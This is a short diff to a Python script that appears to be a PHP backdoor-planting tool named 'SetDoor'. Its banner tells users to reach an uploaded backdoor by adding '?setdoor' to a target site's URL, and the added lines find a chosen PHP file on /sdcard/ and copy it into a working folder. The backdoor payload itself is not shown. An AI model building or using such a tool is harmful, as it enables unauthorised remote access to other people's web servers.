@@ -20,6 +20,16 @@ print("<======================================================>")
 print(":::::Uploaded Backdoor can be Accessed by :::::\n:::::adding \"?setdoor\" to the URL after :::::::\n:::::uploading your file to the server ::::::::\n example :: Yourtargetsite.com/yourfile.php?setfile")
 print("<======================================================>")
 print("\033[1;37m")
+os.system('echo "Enter the Name of your php file"
+read name
+aa=`find //sdcard/ -name $name`
+if [ $aa ]
+then
+cp $aa $HOME/SetDoor
+echo "succes"
+else
+echo "not found"
+fi')
 count = 1
 while count < 10:
     print("\033[1;37m")
